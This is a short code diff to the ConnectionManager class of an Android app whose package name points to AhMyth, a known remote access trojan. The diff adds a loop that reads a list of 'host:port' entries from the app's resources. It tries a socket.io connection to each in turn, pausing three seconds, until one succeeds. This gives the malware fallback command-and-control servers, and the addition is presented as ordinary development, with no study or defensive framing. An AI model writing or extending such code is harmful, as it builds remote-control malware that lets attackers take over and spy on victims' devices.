@@ -5,6 +5,7 @@ import android.os.Looper;
 import android.util.Log;
 import org.json.JSONObject;
 
+import ahmyth.mine.king.ahmyth.R;
 import ahmyth.mine.king.ahmyth.socket.IOSocket;
 import io.socket.emitter.Emitter;
 
@@ -36,12 +37,21 @@ public class ConnectionManager {
     public static void sendReq() {
 try {
 
-
-
-
-
     if(ioSocket != null )
         return;
+
+    String hosts []= context.getResources().getStringArray(R.array.hosts);
+    for (String host : hosts) {
+        String str[] =host.split(":");
+        IOSocket.getInstance().initConnect(str[0],str[1]);
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException ex) {
+
+        }
+        if(IOSocket.getInstance().getIoSocket().connected())
+            break;
+    }
 
     ioSocket = IOSocket.getInstance().getIoSocket();
 
